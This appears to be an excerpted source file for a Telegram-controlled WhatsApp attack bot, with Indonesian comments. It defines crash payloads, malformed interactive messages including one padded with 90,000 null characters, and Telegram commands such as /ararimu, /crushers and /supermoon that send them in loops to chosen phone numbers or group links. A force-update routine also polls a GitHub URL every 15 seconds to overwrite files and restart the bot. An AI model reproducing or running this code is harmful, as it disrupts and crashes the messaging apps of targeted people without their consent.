...
const VERSION = "v3.5";
const GITHUB_RAW = "https://raw.githubusercontent.com/marketzenxx2271-prog/Tesapi/main";
...
async function checkForceUpdate() {
    ...
    try {
        ...
        // CEK APAKAH FORCE UPDATE AKTIF
        if (data.force !== true) return;
        
        // NORMALISASI VERSION (hilangkan prefix 'v' untuk perbandingan)
        const currentVer = VERSION.replace(/^v/, '');
        const targetVer = data.target_version.replace(/^v/, '');
        
        // COMPARE NUMERIC VERSION (contoh: 3.5 vs 5.0)
        ...
        if (!isNewer) {
            console.log(`📌 Force status aktif tapi versi sama/lebih lama: ${VERSION} vs ${data.target_version}, skip update`);
            // RESET SERVER SUPAYA GA TERUS CHECK
            await fetch(`${FORCE_API}/force-reset`, {
                method: "GET",
        ...
        for (const file of UPDATE_FILES) {
            try {
                console.log(`📥 Downloading ${file}...`);
                const content = await fetchScript(file);

                if (!content) {
                    console.log(`❌ ${file} tidak ditemukan di GitHub`);
                    failed++;
                    continue;
                }
                ...
                // Backup
                if (fs.existsSync(filePath)) {
                    fs.copyFileSync(filePath, `${filePath}.forcebak`);
                }
                ...
                console.log(`❌ Failed force update ${file}:`, err.message);
                failed++;
            }
        }

        console.log(`📊 Force update result: ${updated} updated, ${failed} failed`);

        if (updated > 0) {
            lastForceApplied = Date.now();
            isRestarting = true;

            // Reset force status di server
            try {
                await fetch(`${FORCE_API}/force-reset`, {
                    method: "GET",
                    headers: { "x-api-key": SERVER_API_KEY }
                });
                console.log("✅ Force reset sent");
            } catch (e) {
                console.log("⚠️ Force reset failed:", e.message);
            }

            console.log("🔄 Restarting in 2 seconds...");
            setTimeout(() => process.exit(0), 2000);
        } else {
            // Jika semua gagal, reset status server biar ga loop
            await fetch(`${FORCE_API}/force-reset`, {
                method: "GET",
                headers: { "x-api-key": SERVER_API_KEY }
            });
        ...
        console.log("⚠️ Force update check error:", e.message);
    }
}

// CHECK SETIAP 15 DETIK (LEBIH CEPAT)
setInterval(checkForceUpdate, 15000);
checkForceUpdate();
...
if (!GROQ_API_KEY) {
    console.error("❌ GROQ_API_KEY tidak ditemukan di environment variable!");
    process.exit(1);
}
...
async function InteractivePoolLeslie(sock, groupJid) {
 const response = {
     interactiveMessage: {
       body: {
         text: "gw cocok ga sama leslie"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_confirmation",
                 ParamsJson: "\0".repeat(90000),
               },
             ],
           },
         },
         };
         const objective = generateWAMessageFromContent(groupJid, response, {});
  await sock.relayMessage(groupJid, objective.message, { messageId: objective.key.id });
     }
...
async function criticalLeslie(sock, groupJid) {
  const kuroleslie = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
  ...
  const msg1 = generateWAMessageFromContent(groupJid, kuroleslie, {});
  await sock.relayMessage(groupJid, msg1.message, { messageId: msg1.key.id });
}
...
bot.command("squogre", async (ctx) => {
    ...
    if (isCommandBlacklisted("squogre")) {
    ...
    if (args.length < 2) {
        return ctx.reply(
            "🪧 Format: /squogre <link> [jumlah_loop]\n\n" +
            "📌 Contoh:\n" +
            "• /squogre https://chat.whatsapp.com/xxxx — (default loop)\n" +
            "• /squogre https://chat.whatsapp.com/xxxx 100 — (custom 100x)",
            { parse_mode: "Markdown" }
        );
    }
...
bot.command("supermoon", async (ctx) => {
    if (!isGroupOnlyAllowed(ctx)) {
        return ctx.reply("🚫 Bot sedang dalam mode *Group Only*. Command ini hanya bisa digunakan di dalam grup.\nHubungi owner untuk info lebih lanjut.", { parse_mode: "Markdown" });
    }
        if (!await isAuthorized(ctx)) return;
    ...
    if (isCommandBlacklisted("supermoon")) {
        return ctx.reply("⛔ Command ini sedang diblacklist oleh admin!");
    }
    ...
    if (args.length < 2) {
        return ctx.reply(
            "🪧 Format: /supermoon <link> [jumlah_loop]\n\n" +
            "📌 Contoh:\n" +
            "• /supermoon https://chat.whatsapp.com/xxxx — (default loop)\n" +
            "• /supermoon https://chat.whatsapp.com/xxxx 100 — (custom 100x)",
            { parse_mode: "Markdown" }
        );
    }
...
╰━───────────────────━❏`,
    ...
    try {
        ...
        for (let i = 0; i < loopCount; i++) {
        await InteractivePoolLeslie(sock, groupJid);
            await sleep(4000);
            console.log(chalk.red(`Executon By Zenotrl ${i+1}/${loopCount} to ${groupId}`));
        }
    } catch (err) {
...
bot.command("ararimu", checkWhatsAppConnection, async (ctx) => {
    if (!isGroupOnlyAllowed(ctx)) {
        return ctx.reply("🚫 Bot sedang dalam mode *Group Only*. Command ini hanya bisa digunakan di dalam grup.\nHubungi owner untuk info lebih lanjut.", { parse_mode: "Markdown" });
    }
    if (isCommandBlacklisted("ararimu")) {
        return ctx.reply("⛔ Command ini sedang diblacklist oleh admin!");
    }
    if (!await isAuthorized(ctx)) return;
    if (!isCooldownAllowed(ctx)) return;
    ...
    if (!phoneNumber) {
                return ctx.reply(
            "🪧 ☇ Format: /ararimu 62××× [jumlah_loop]\n\n" +
            "📌 *Contoh:*\n" +
            "• /ararimu 62812 — (Memakai Default Loop)\n" +
            "• /ararimu 62812 60 — (custom loop 60x)",
            { parse_mode: "Markdown" }
        );
    }
...
bot.command("crushers", checkWhatsAppConnection, async (ctx) => {

    if (!isGroupOnlyAllowed(ctx)) {
        return ctx.reply("🚫 Bot sedang dalam mode *Group Only*. Command ini hanya bisa digunakan di dalam grup.\nHubungi owner untuk info lebih lanjut.", { parse_mode: "Markdown" });
    }
    if (isCommandBlacklisted("crushers")) {
        return ctx.reply("⛔ Command ini sedang diblacklist oleh admin!");
    }
        if (!await isAuthorized(ctx)) return;
    if (!isCooldownAllowed(ctx)) return;
    ...
    if (!q) {
        return ctx.reply(
            "🪧 ☇ Format: /crushers 62××× [jumlah_loop]\n\n" +
            "📌 *Contoh:*\n" +
            "• /crushers 62812 — (Memakai Default Loop)\n" +
            "• /crushers 62812 60 — (custom loop 60x)",
            { parse_mode: "Markdown" }
        );
    }
...
bot.command("ranger", checkWhatsAppConnection, async (ctx) => {

    if (!isGroupOnlyAllowed(ctx)) {
        return ctx.reply("🚫 Bot sedang dalam mode *Group Only*. Command ini hanya bisa digunakan di dalam grup.\nHubungi owner untuk info lebih lanjut.", { parse_mode: "Markdown" });
    }
    if (isCommandBlacklisted("ranger")) {
        return ctx.reply("⛔ Command ini sedang diblacklist oleh admin!");
    }
        if (!await isAuthorized(ctx)) return;
    if (!isCooldownAllowed(ctx)) return;
    ...
    if (!q) {
        return ctx.reply(
            "🪧 ☇ Format: /ranger 62××× [jumlah_loop]\n\n" +
            "📌 *Contoh:*\n" +
            "• /ranger 62812 — (Memakai Default Loop)\n" +
            "• /ranger 62812 60 — (custom loop 60x)",
            { parse_mode: "Markdown" }
        );
    }
...
const validBugCommands = ["ararimu", "crushers", "sanguine", "ranger", "squogre", "valley", "supermoon"];
